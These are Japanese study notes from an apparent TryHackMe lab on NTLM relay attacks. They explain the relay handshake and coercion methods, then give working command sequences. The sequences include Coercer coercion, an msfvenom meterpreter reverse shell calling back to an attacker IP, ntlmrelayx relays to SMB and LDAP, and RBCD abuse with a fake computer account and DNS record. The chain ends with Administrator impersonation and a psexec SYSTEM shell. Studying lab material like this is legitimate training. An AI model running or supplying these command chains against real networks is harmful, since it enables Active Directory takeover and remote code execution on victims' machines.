# NTLMリレー

https://tryhackme.com/room/ntlmrelayattacks

## 基礎

リレー攻撃では、攻撃者は認証クライアントとターゲットサーバーの間に入り込み、中間者として振る舞う。

1. 被害者（例：MS01$）は攻撃者に対してNTLM NEGOTIATEメッセージを送信する。
2. 攻撃者はそのNEGOTIATEを実際のターゲット（例：DC01）に転送します。LDAP）
3. DC01はCHALLENGEを返信し、攻撃者はそれをMS01$に渡します。
4. MS01$はDC01のチャレンジを使用して応答を計算し、AUTHENTICATEを攻撃者に返信します。
5. 攻撃者はその認証要求をDC01に転送し、DC01は計算が正しいのでそれを受け入れる。

全てのNTLMリレーは、処理中のNTLM認証をキャプチャし、それをそのまま受け入れる別のサービスに転送する。攻撃間で変化するのは、次の3つの変数だけ。

1. 認証を取得する方法― 強制か、受動的なポイズニングか。
2. 転送先— SMB、LDAP/S、HTTP（AD CS）、MSSQLなど。
3. 認証が完了したら、コードの実行、Active Directory属性の書き込み、証明書の要求などを行う。

### 攻撃の流れ

1. 認証されたドメインユーザー（ここでは、jdoe）として、被害者に対して RPC メソッドを呼び出し、「ここに通知してください」ターゲットとして攻撃者の IP アドレスまたはホスト名を渡します。
2. 被害者のサービスは、あなたへの接続を開き、NTLMハンドシェイクを開始します。これは、SYSTEMサービスがネットワーク上で使用するIDがマシンアカウントであるためです。
3. その受信ハンドシェイクは、リレーに必要な情報そのものです。それを実際のターゲット（SMBまたはLDAP）に転送すれば、被害者のマシンアカウントとして認証されます。

### 強制プリミティブの種類

- PrinterBug (MS-RPRN)
- PetitPotam (MS-EFSRPC)
- ADCS
- MSSQL
- 等々

### ツール

#### [Coercer](https://github.com/p0dalirius/Coercer)

あらゆる強制手法を一括して呼び出すことができる単一のツール

```sh
pip3 install coercer
```

```sh
coercer coerce -t <Target> -l <Attacker Machine> -u <Username> -p <Password> -d <domain>
```

## [SMBリレー](https://tryhackme.com/room/ntlmrelayattacks?taskNo=3&sharerId=674ed42e2374d1bc93db444c)

```sh
# リレー先のSMB署名が無効である必要がある
nxc smb $ip

(signing:False)
```

```sh
# リバースシェルの準備
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.22.2 LPORT=4444 -f exe -o shell.exe

msfconsole -q

msf> use exploit/multi/handler
msf (multi/handler)> set payload windows/x64/meterpreter/reverse_tcp
msf (multi/handler)> set LHOST 192.168.22.2
msf (multi/handler)> set LPORT 4444
msf (multi/handler)> run
```

```sh
pip install "setuptools<70.0.0"
pip install dsinternals

# リレーするプロセスの起動
ntlmrelayx.py -t smb://192.168.13.101 -smb2support -e shell.exe
```

```sh
# 強制をトリガー
coercer coerce -t 192.168.13.102 -l 192.168.22.2 -u jdoe -p 'Password123!' -d relay.thm --filter-protocol-name "MS-RPRN"
```

## [LDAPリレー (RBCD abuse)](https://tryhackme.com/room/ntlmrelayattacks?taskNo=4&sharerId=674ed42e2374d1bc93db444c)

```sh
# コンピュータアカウントの作成
addcomputer.py -dc-ip 192.168.13.100 RELAY/jdoe:Password123! -computer-name FAKE01 -computer-pass 'FakePass123!'
```

```sh
# リレーの準備
ntlmrelayx.py -t ldap://192.168.13.100 --delegate-access --escalate-user FAKE01$ -smb2support
```

```sh
git clone https://github.com/dirkjanm/krbrelayx/
cd krbrelayx
pip3 install --upgrade dnspython
```

```sh
# 攻撃マシンに attacker.relay.thm ホスト名を割り当てる
python3 dnstool.py -u 'RELAY\jdoe' -p 'Password123!' -r attacker -a add -t A -d 192.168.22.2 192.168.13.100

# 確認（反映に1，2分かかる）
nslookup attacker.relay.thm 192.168.13.100
```

```sh
# 強制
coercer coerce -t 192.168.13.101 -l 'attacker.relay.thm@80/x' -u jdoe -p 'Password123!' -d relay.thm --filter-protocol-name "MS-EFSR"
```

ntlmrelayxの表示

```sh
[*] Delegation rights modified succesfully!
[*] FAKE01$ can now impersonate users on MS01$ via S4U2Proxy
```

```sh
# サービスチケットをリクエスト
getST.py -spn cifs/ms01.relay.thm -impersonate Administrator RELAY/FAKE01$:FakePass123! -dc-ip 192.168.13.100
```

```sh
# hostsに追加が必要
192.168.13.101 ms01.relay.thm
```

```sh
# チケットを使用
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass ms01.relay.thm

C:\Windows\system32> 
```

